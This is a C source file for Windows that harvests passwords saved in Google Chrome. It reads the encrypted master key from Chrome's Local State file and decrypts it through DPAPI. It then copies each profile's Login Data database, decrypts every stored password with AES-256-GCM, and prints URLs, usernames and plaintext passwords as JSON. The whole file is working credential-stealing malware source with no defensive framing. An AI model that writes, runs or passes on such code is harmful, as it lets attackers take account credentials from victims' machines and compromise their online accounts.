#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <sqlite3.h>
#include <wincrypt.h>
#include <openssl/evp.h>
#include <cJSON/cJSON.h>


#define MAX_PATH_LENGTH 260 // Maximum path length

#define CHROME_PATH(chromePath) snprintf(chromePath, MAX_PATH_LENGTH, \
        "%s\\AppData\\Local\\Google\\Chrome\\User Data", getenv("USERPROFILE"));
#define CHROME_PATH_LOCAL_STATE(chromePath) snprintf(chromePath, MAX_PATH_LENGTH, \
        "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", getenv("USERPROFILE"));

//========= Copy Files from one folder to another folder ==========//
int copyFile(const char* sourcePath, const char* destinationPath);

//========= Gives the Database connection of the file    ==========//
sqlite3* getDBConnection(const char* chromePathLoginDB);

//========= Gives the chrome saved passwords ======================//
char* GetChromeSavedPasswords();

// ======== Function to get secret key from the Local State file===//
int GetSecretKey(const char* localStatePath, DATA_BLOB* dataOut);

// ======== Decrypt passwrod from local state file ================//
BYTE* DecryptPassword(DATA_BLOB CipherData, DATA_BLOB SecretKey);

// ======== AES decryption implementation =========================//
BYTE * Decrypt_AES(const unsigned char *secret_key, const unsigned char *initialization_vector, const unsigned char *encrypted_password, size_t encrypted_length);

// Defination of the function named copyFile
int copyFile(const char* sourcePath, const char* destinationPath) {
	FILE* sourceFile = fopen(sourcePath, "rb");
	FILE* destinationFile = fopen(destinationPath, "wb");

	if (sourceFile == NULL || destinationFile == NULL) {
		perror("Error opening file");
		return 1;
	}

	char buffer[4096];
	size_t bytesRead;

	while ((bytesRead = fread(buffer, 1, sizeof(buffer), sourceFile)) > 0) {
		fwrite(buffer, 1, bytesRead, destinationFile);
	}

	fclose(sourceFile);
	fclose(destinationFile);

	return 0;
}

// Gives the database connection 
sqlite3* getDBConnection(const char* chromePathLoginDB) {
	char destinationPath[MAX_PATH_LENGTH] = "Loginvault.db";


	// Copy the Chrome database to a local file
	if (copyFile(chromePathLoginDB, destinationPath) != 0) {
		fprintf(stderr, "[ERR] Chrome database cannot be found\n");
		return NULL;
	}

	// Open a connection to the local database
	sqlite3* dbConnection;
	if (sqlite3_open(destinationPath, &dbConnection) != SQLITE_OK) {
		fprintf(stderr, "[ERR] Unable to open database: %s\n", sqlite3_errmsg(dbConnection));
		return NULL;
	}
	return dbConnection;
}

// Function to get the secret key from the Local State file
int GetSecretKey(const char* localStatePath, DATA_BLOB* dataOut) {
    // Open the Local State file
    FILE* file = fopen(localStatePath, "r");
    if (file == NULL) {
        perror("[-]: Error opening file");
        fprintf(stderr, "[-]: File path: %s\n", localStatePath);
        return 1;
    }
	
    // Calculate the file size
    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Allocate memory to store the file content
    char* localState = (char*)malloc(fileSize + 1);
    if (localState == NULL) {
        perror("[-]: Memory allocation error");
        fclose(file);
        return 1;
    }

    // Read the file content into the allocated memory
    fread(localState, 1, fileSize, file);
    fclose(file);
    localState[fileSize] = '\0';

    // Parse the file content as JSON
    cJSON* root = cJSON_Parse(localState);
    if (root == NULL) {
        fprintf(stderr, "[-]: Error parsing JSON: %s\n", cJSON_GetErrorPtr());
        free(localState);
        return 1;
    }

    // Get the 'os_crypt' object from the JSON
    cJSON* osCrypt = cJSON_GetObjectItem(root, "os_crypt");
    if (osCrypt == NULL) {
        fprintf(stderr, "[-]: Failed to find 'os_crypt' object in Local State file\n");
        cJSON_Delete(root);
        free(localState);
        return 1;
    }

    // Get the 'encrypted_key' from the 'os_crypt' object
    cJSON* encryptedKey = cJSON_GetObjectItem(osCrypt, "encrypted_key");
    if (encryptedKey == NULL) {
        fprintf(stderr, "[-]: Failed to find 'encrypted_key' in 'os_crypt' object\n");
        cJSON_Delete(root);
        free(localState);
        return 1;
    }

    // Extract the encrypted key string
    const char* encryptedKeyStr = cJSON_GetStringValue(encryptedKey);

    // Convert the Base64-encoded string to binary
    DWORD decodedSize;
    CryptStringToBinaryA(encryptedKeyStr, 0, CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL);
    BYTE* decodedKey = (BYTE*)malloc(decodedSize);
    CryptStringToBinaryA(encryptedKeyStr, 0, CRYPT_STRING_BASE64, decodedKey, &decodedSize, NULL, NULL);

    // Remove the first 5 bytes from the decoded key
    decodedSize = decodedSize - 5;
    memmove(decodedKey, decodedKey + 5, decodedSize);

    // Set up the input data for decryption
    DATA_BLOB dataIn = { decodedSize, decodedKey };
    memset(dataOut, 0, sizeof(DATA_BLOB));

    // Decrypt the key
    if (!CryptUnprotectData(&dataIn, NULL, NULL, NULL, NULL, 0, dataOut)) {
        fprintf(stderr, "[-]: Failed to decrypt key\n");
        cJSON_Delete(root);
        free(localState);
        free(decodedKey);
        return 1;
    }

    // Clean up and return
    cJSON_Delete(root);
    free(localState);
    free(decodedKey);
    return 1;
}
// Function to decrypt the password obtained from database file
BYTE* DecryptPassword(DATA_BLOB CipherData, DATA_BLOB SecretKey) {
	
	int start_index = 3;
	int end_index = 15;
	// Calculate the length of the substring to extract
	int substring_length = end_index - start_index;
	// Allocate memory for the substring
	BYTE *initialisation_vector = malloc(substring_length + 1 * sizeof(BYTE)); // +1 for the null terminator

	memcpy(initialisation_vector, CipherData.pbData + start_index, substring_length);

	// Calculate the length of the key
	size_t len = CipherData.cbData;
	size_t enc_len = 0;
	BYTE *encrypted_password = NULL,*pass = NULL;
	
    if (len >= 32) {  // Assuming 16 characters before and 16 characters after the slice
        // Extract the substring
        enc_len = (len - 15) - 16;
        const BYTE* substring = (BYTE*)CipherData.pbData + 15;

        // Allocate memory for the encrypted password
        encrypted_password = malloc(enc_len);
        memcpy(encrypted_password, substring, enc_len);
		pass = Decrypt_AES(SecretKey.pbData,initialisation_vector,encrypted_password,enc_len);
    }

    // Clean up allocated memory
    free(initialisation_vector);
    free(encrypted_password);

    return pass;  // Modify the return type as needed
}

// AES decryption implementation
BYTE * Decrypt_AES(const unsigned char *secret_key, const unsigned char *initialization_vector, const unsigned char *encrypted_password, size_t encrypted_length) {
    EVP_CIPHER_CTX *ctx;

    // Create and initialize the context
    ctx = EVP_CIPHER_CTX_new();

    // Initialize the decryption operation with AES-GCM
    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, secret_key, initialization_vector);

    // Provide any AAD (Additional Authenticated Data)
    // For GCM mode, this step is optional, set to NULL if not used

    // Decrypt the data
    int len;
    BYTE *decrypted_password = malloc(256 * sizeof(BYTE));  // Adjust the size as needed
    EVP_DecryptUpdate(ctx, decrypted_password, &len, encrypted_password, encrypted_length);

    // Finalize the decryption
    int final_len;
    EVP_DecryptFinal_ex(ctx, decrypted_password + len, &final_len);

    // Assuming the decrypted data is a string
    decrypted_password[len + final_len] = '\0';

    // Clean up
    EVP_CIPHER_CTX_free(ctx);
    return decrypted_password;
}

char* GetChromeSavedPasswords(){
	char UserDataPath[MAX_PATH_LENGTH],LocalStatePath[MAX_PATH_LENGTH];
	CHROME_PATH_LOCAL_STATE(LocalStatePath);
	CHROME_PATH(UserDataPath);
	DATA_BLOB SecretKey;
	
	WIN32_FIND_DATAA findFileData;
	char path[MAX_PATH_LENGTH];
	sprintf(path,"%s\\*",UserDataPath);
	
	GetSecretKey(LocalStatePath, &SecretKey);

	HANDLE hFind = FindFirstFileA(path, &findFileData);

	if (hFind == INVALID_HANDLE_VALUE) {
		perror("Error opening Chrome User Data directory");
		exit(EXIT_FAILURE);
	}
	char *json_string;
	do {
		if (strstr(findFileData.cFileName, "Profile ") != NULL || strstr(findFileData.cFileName, "Default") != NULL)  {
			// Found a matching folder (Profile* or Default)
			char loginDataPath[MAX_PATH_LENGTH];
			snprintf(loginDataPath, MAX_PATH_LENGTH,
			         "%s\\%s\\Login Data", UserDataPath, findFileData.cFileName);

			sqlite3* conn = getDBConnection(loginDataPath);

			if (conn != NULL) {

				sqlite3_stmt *stmt;
				const char *query = "SELECT action_url, username_value, password_value FROM logins";
				
				if (sqlite3_prepare_v2(conn, query, -1, &stmt, NULL) == SQLITE_OK) {
					int result;
					 // Create a cJSON array
    				cJSON *json_array = cJSON_CreateArray();
    				int i = 1;
					while ((result = sqlite3_step(stmt)) == SQLITE_ROW) {
						const char *url 		= (const char *)sqlite3_column_text(stmt, 0);
						const char *username 	= (const char *)sqlite3_column_text(stmt, 1);
						BYTE  *ciphertext 		= (BYTE *)sqlite3_column_blob(stmt, 2);
						int bytes 				= sqlite3_column_bytes(stmt, 2);
						if(strcmp(url, "") && strcmp(username, "")  && memcmp(ciphertext,"",1)) {
							DATA_BLOB cipher = (DATA_BLOB) {bytes,ciphertext};
							// Create a cJSON object for an entry
					        cJSON *entry = cJSON_CreateObject();

					        // Add id, url, username, and password to the entry
					        cJSON_AddNumberToObject(entry, "id", i);
					        cJSON_AddStringToObject(entry, "url", url);
					        cJSON_AddStringToObject(entry, "username", username);
					        cJSON_AddStringToObject(entry, "password", DecryptPassword(cipher,SecretKey));

					        // Add the entry to the array
					        cJSON_AddItemToArray(json_array, entry);
					        i++;
						}
						
					}
					json_string = cJSON_Print(json_array);
					cJSON_Delete(json_array);
					sqlite3_finalize(stmt);
				} else {
					fprintf(stderr, "Error preparing SQL statement: %s\n", sqlite3_errmsg(conn));
				}
			} // If connection established
		} // Filtering only user profiles
	} while (FindNextFileA(hFind, &findFileData) != 0); 	// Get user profiles all
	FindClose(hFind);

    return json_string;
}
int main(){
	printf("%s\n",GetChromeSavedPasswords());
}